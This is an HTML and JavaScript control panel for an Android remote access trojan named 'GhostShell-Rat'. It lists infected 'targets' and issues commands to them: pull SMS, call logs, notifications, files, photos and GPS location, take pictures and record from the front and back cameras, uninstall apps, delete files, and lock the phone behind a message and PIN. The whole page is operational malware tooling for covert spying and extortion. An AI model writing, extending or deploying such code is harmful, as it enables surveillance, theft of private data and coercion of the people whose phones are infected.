<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>GhostShell-Rat ¬∑ anonymous</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui; }
        :root {
            --bg: #0b0f0e; --surface: #141a1a; --surface-light: #1f2828;
            --accent-primary: #00ffc3; --accent-secondary: #ff3b9e;
            --glow-primary: rgba(0, 255, 195, 0.25); --glow-secondary: rgba(255, 59, 158, 0.3);
            --text: #dbdbdb; --text-dim: #8fadad; --transition: all 0.25s cubic-bezier(0.23, 1, 0.32, 1);
        }
        body { background-color: var(--bg); color: var(--text); min-height: 100vh; padding: 8px; background-attachment: fixed; }
        #sys-loader { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.6s ease; }
        .loader-hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .cyber-bar { width: 260px; height: 6px; background: #1f2b2b; border-radius: 8px; margin: 20px 0; overflow: hidden; }
        .cyber-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary)); box-shadow: 0 0 18px var(--glow-primary); transition: width 0.5s; }
        .app-container { width: 100%; max-width: 1300px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; }
        .header { background: var(--surface); border: 1px solid var(--accent-primary); padding: 1rem; border-radius: 28px; display: flex; justify-content: space-between; align-items: center; }
        .dashboard-grid { display: grid; grid-template-columns: 260px 1fr; gap: 16px; }
        .device-panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 18px; max-height: 70vh; overflow-y: auto; }
        .device-item { background: #1b2626; padding: 14px; border-radius: 18px; border: 1px solid transparent; cursor: pointer; margin-bottom: 8px; }
        .device-item.active { border-color: var(--accent-secondary); box-shadow: 0 0 16px var(--glow-secondary); }
        .main-panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 18px; }
        .status-bar-mod { display: flex; justify-content: space-between; background: #0f1818; padding: 12px 18px; border-radius: 40px; margin-bottom: 22px; border: 1px solid #2a3a3a; }
        .feature-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 12px; }
        .grid-item { background: #1b2828; border: 1px solid #2f4040; border-radius: 24px; padding: 16px 6px; text-align: center; color: var(--accent-primary); cursor: pointer; transition: var(--transition); }
        .grid-item i { font-size: 2rem; margin-bottom: 8px; display: block; color: var(--accent-secondary); }
        .grid-item.disabled { opacity: 0.2; pointer-events: none; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; padding: 16px; }
        .modal-card { background: var(--surface); width: 100%; max-width: 900px; max-height: 85vh; border-radius: 36px; border: 1px solid var(--accent-primary); display: flex; flex-direction: column; overflow: hidden; }
        .modal-header { padding: 16px 24px; background: #101b1b; display: flex; justify-content: space-between; align-items: center; }
        .modal-body { padding: 20px; overflow-y: auto; flex: 1; background: #121d1d; }
        .modal-footer { padding: 16px; background: #0c1616; display: flex; gap: 10px; flex-wrap: wrap; }
        .toast-popup { position: fixed; top: 20px; right: 20px; background: #121f1f; border-left: 6px solid var(--accent-secondary); padding: 15px 25px; border-radius: 40px; border: 1px solid var(--accent-primary); z-index: 3000; transition: 0.3s; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { color: var(--accent-primary); border-bottom: 1px solid #333; padding: 10px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #222; color: #ccc; }
        input, button { background: #1e2e2e; border: 1px solid #3b5e5e; padding: 10px 20px; border-radius: 30px; color: #fff; }
        button { background: var(--accent-primary); color: #000; font-weight: bold; cursor: pointer; border: none; }
        @media (max-width: 700px) { .dashboard-grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div id="sys-loader">
        <div style="font-size: 2rem; color: var(--accent-primary);">GHOST//SHELL</div>
        <div class="cyber-bar"><div class="cyber-fill" id="loader-fill"></div></div>
    </div>

    <div class="app-container">
        <header class="header">
            <h1><i class="fas fa-skull"></i> GhostShell-Rat</h1>
            <div style="color:var(--accent-secondary); font-size:1.5rem;"><i class="fas fa-ghost"></i></div>
        </header>
        <div class="dashboard-grid">
            <div class="device-panel">
                <h2 style="color:var(--accent-secondary); margin-bottom:15px;"><i class="fas fa-satellite-dish"></i> TARGETS</h2>
                <div id="device-list"></div>
            </div>
            <div class="main-panel">
                <div class="status-bar-mod">
                    <span>üéØ <span id="device-info" style="color:var(--accent-primary)">None</span></span>
                    <span>‚ö° <span id="connection-status">OFFLINE</span></span>
                </div>
                <div class="feature-grid" id="main-grid-panel"></div>
            </div>
        </div>
    </div>

    <div id="main-modal" class="modal">
        <div class="modal-card">
            <div class="modal-header">
                <h2 id="modal-title" style="color:var(--accent-secondary)">MODAL</h2>
                <span style="cursor:pointer; font-size:2rem;" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body" id="modal-body"></div>
            <div class="modal-footer" id="modal-footer"></div>
        </div>
    </div>
    <div id="popup-toast" class="toast-popup" style="display:none;"></div>

    <script>
        let state = { devices: [] };
        let selectedClientId = null;
        let currentModal = null;
        let clientDataCache = {};
        let notificationHashes = new Set();
        let agentMessageHashes = new Set();
        let flashOn = false, screenRecordOn = false;
        let lastDataHash = "";

        window.onload = () => {
            let w = 0;
            const iv = setInterval(() => {
                w += 5;
                document.getElementById('loader-fill').style.width = w + '%';
                if(w >= 100) { clearInterval(iv); document.getElementById('sys-loader').classList.add('loader-hidden'); }
            }, 30);
            pollStatus();
        };

        function showPopup(type, msg) {
            const t = document.getElementById('popup-toast');
            t.style.display = 'block';
            t.innerHTML = `<i class="fas fa-bell"></i> ${msg}`;
            setTimeout(() => t.style.display = 'none', 5000);
        }

        async function sendCommand(cmd, body = {}) {
            if(!selectedClientId) return;
            try {
                await fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({cmd, client_id: selectedClientId, ...body})
                });
            } catch(e) {}
        }

        function selectDevice(id) {
            selectedClientId = id;
            updateDeviceList();
            updateMainDashboard();
        }

        function updateDeviceList() {
            const container = document.getElementById('device-list');
            container.innerHTML = state.devices.map(d => `
                <div class="device-item ${selectedClientId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
                    <strong>${d.model}</strong><br><small>${d.id} ¬∑ ${d.battery}</small>
                </div>
            `).join('') || '<p>No targets online</p>';
        }

        function updateMainDashboard() {
            const grid = document.getElementById('main-grid-panel');
            const enabled = !!selectedClientId;
            document.getElementById('connection-status').innerText = enabled ? 'ONLINE' : 'OFFLINE';
            document.getElementById('connection-status').style.color = enabled ? '#00ffc3' : '#ff3b9e';
            document.getElementById('device-info').innerText = selectedClientId || 'None';

            const btns = [
                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'},
                {id:'filemanager', i:'fa-folder-open', l:'FILES'}, {id:'gallery', i:'fa-images', l:'GALLERY'},
                {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th-large', l:'APPS'},
                {id:'get_location', i:'fa-map-marker-alt', l:'GPS START'}, {id:'stop_location', i:'fa-map-slash', l:'GPS STOP'},
                {id:'flash', i:'fa-bolt', l: flashOn ? 'FLASH OFF' : 'FLASH ON'},
                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                {id:'record_back', i:'fa-circle-dot', l:'REC BACK'}, {id:'record_front', i:'fa-record-vinyl', l:'REC FRONT'},
                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-window-maximize', l:'LOCK/MSG'}
            ];

            grid.innerHTML = btns.map(b => `
                <div class="grid-item ${!enabled ? 'disabled' : ''}" onclick="handleGridClick('${b.id}')">
                    <i class="fas ${b.i}"></i>${b.l}
                </div>
            `).join('');
        }

        function handleGridClick(act) {
            if(act === 'flash') { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); updateMainDashboard(); return; }
            if(act === 'record_back' || act === 'record_front' || act === 'stop_location') { sendCommand(act); return; }
            if(act === 'get_location') { sendCommand('get_location'); openModal('get_location'); return; }
            openModal(act);
        }

        function openModal(type) {
            currentModal = type;
            lastDataHash = "";
            document.getElementById('main-modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = type.toUpperCase();
            document.getElementById('modal-body').innerHTML = '<p>Loading data...</p>';
            
            const cmdMap = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic' };
            if(cmdMap[type]) sendCommand(cmdMap[type]);
            renderModalContent();
        }

        function closeModal() {
            if(currentModal === 'gallery') sendCommand('exit_gallery');
            if(currentModal === 'filemanager') sendCommand('exit_shell');
            document.getElementById('main-modal').style.display = 'none';
            currentModal = null;
        }

        function renderModalContent() {
            if(!currentModal || !selectedClientId) return;
            const data = clientDataCache[selectedClientId] || {};
            const body = document.getElementById('modal-body');
            const footer = document.getElementById('modal-footer');
            
            const currentHash = JSON.stringify(data[currentModal] || data[`${currentModal}_logs`] || data.camera_image || data.location_url || "");
            if(lastDataHash === currentHash) return;
            lastDataHash = currentHash;

            footer.innerHTML = ''; body.innerHTML = '';

            if(currentModal === 'sms') {
                const logs = data.sms_logs || [];
                body.innerHTML = `<table><tr><th>Sender</th><th>Message</th></tr>${logs.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
            } else if(currentModal === 'calls') {
                const logs = data.call_logs || [];
                body.innerHTML = `<table><tr><th>Number</th><th>Duration</th></tr>${logs.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
            } else if(currentModal === 'apps') {
                const apps = data.apps || [];
                body.innerHTML = `<table><tr><th>App</th><th>Action</th></tr>${apps.map(a=>`<tr><td>${a.appName}</td><td><button onclick="sendCommand('run ${a.packageName}')">Run</button> <button style="background:red" onclick="sendCommand('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
            } else if(currentModal === 'filemanager') {
                const fm = data.file_manager || {path:'/', files:[]};
                body.innerHTML = `
                    <div style="display:flex; gap:10px; margin-bottom:10px;">
                        <input id="fm-cmd" placeholder="Manual cmd: cd Downloads" style="flex:1">
                        <button onclick="sendCommand(document.getElementById('fm-cmd').value); document.getElementById('fm-cmd').value=''">EXE</button>
                    </div>
                    <p style="font-size:0.8rem; color:var(--accent-primary)">Path: ${fm.path}</p>
                    <table>${fm.files.map(f => `<tr><td onclick="sendCommand('${f.isDirectory ? 'cd' : 'get'} ${f.name}')" style="cursor:pointer">${f.isDirectory ? 'üìÅ':'üìÑ'} ${f.name}</td><td style="text-align:right"><button onclick="sendCommand('del ${f.name}')">DEL</button></td></tr>`).join('')}</table>`;
                footer.innerHTML = `<button onclick="sendCommand('cd /storage/emulated/0')">SDCARD</button><button onclick="sendCommand('cd /')">ROOT</button>`;
            } else if(currentModal === 'gallery') {
                const gal = data.gallery || {files:[], page:0};
                body.innerHTML = `<div class="gallery-grid">${gal.files.map(f=>`<div class="gallery-item"><img src="data:image/jpeg;base64,${f.thumbnail}"/><p style="font-size:0.6rem">${f.name}</p></div>`).join('')}</div>`;
                footer.innerHTML = `<button onclick="sendCommand('gallery back')">PREV</button><span>Page ${gal.page}</span><button onclick="sendCommand('gallery next')">NEXT</button>`;
            } else if(currentModal === 'get_location') {
                if(data.location_url) {
                    body.innerHTML = `<div style="text-align:center">${data.location_image ? `<img src="${data.location_image}" style="width:100%; border-radius:15px; margin-bottom:10px;">`:''}<p>${data.location_url}</p><br><a href="${data.location_url}" target="_blank"><button>Google Maps</button></a></div>`;
                } else body.innerHTML = '<p>Waiting for GPS...</p>';
            } else if(currentModal === 'takebackpic' || currentModal === 'takefrontpic' || currentModal === 'record_back' || currentModal === 'record_front') {
                const media = data.camera_image || data.last_video;
                if(media) {
                    body.innerHTML = `<div style="text-align:center;">${media.endsWith('.mp4') ? `<video src="/captured_images/${media}" controls style="width:100%"></video>` : `<img src="/captured_images/${media}" style="width:100%; border-radius:15px">`}<br><button onclick="deleteMedia('${media}')" style="background:red; margin-top:10px;">DELETE</button></div>`;
                } else body.innerHTML = '<p>Capturing...</p>';
            } else if(currentModal === 'setwallpaper') {
                body.innerHTML = `<p>Image URL:</p><input id="wall-url" style="width:100%; margin-top:10px;"><br>`;
                footer.innerHTML = `<button onclick="sendCommand('set_wallpaper ' + document.getElementById('wall-url').value)">APPLY</button>`;
            } else if(currentModal === 'toast') {
                body.innerHTML = `<p>Lock Msg:</p><input id="l-msg" style="width:100%"><p>PIN:</p><input id="l-pin" style="width:100%">`;
                footer.innerHTML = `<button onclick="sendCommand('lock ' + document.getElementById('l-msg').value + '|' + document.getElementById('l-pin').value)" style="background:red">LOCK DEVICE</button><button onclick="sendCommand('toast off')">UNLOCK</button>`;
            } else if(currentModal === 'notifications') {
                const ns = data.notifications || [];
                body.innerHTML = `<table><tr><th>App</th><th>Text</th></tr>${ns.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
            }
        }

        async function deleteMedia(filename) {
            if(!confirm('Delete file?')) return;
            await fetch('/api/delete_file', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({filename}) });
            showPopup('info', 'Deleted');
            clientDataCache[selectedClientId].camera_image = null; clientDataCache[selectedClientId].last_video = null;
            renderModalContent();
        }

        async function pollStatus() {
            try {
                const r = await fetch('/api/status');
                state = await r.json();
                updateDeviceList();
                if(selectedClientId) {
                    const dr = await fetch(`/api/client_data/${selectedClientId}`);
                    const cdata = await dr.json();
                    clientDataCache[selectedClientId] = cdata;
                    if(currentModal) renderModalContent();
                    if(cdata.notifications?.length) {
                        const n = cdata.notifications[0];
                        const h = selectedClientId + n.packageName + n.title + n.text;
                        if(!notificationHashes.has(h)) { showPopup('info', `[${n.packageName}] ${n.title}`); notificationHashes.add(h); }
                    }
                }
            } catch(e) {}
            setTimeout(pollStatus, 3000);
        }
    </script>
</body>
</html>
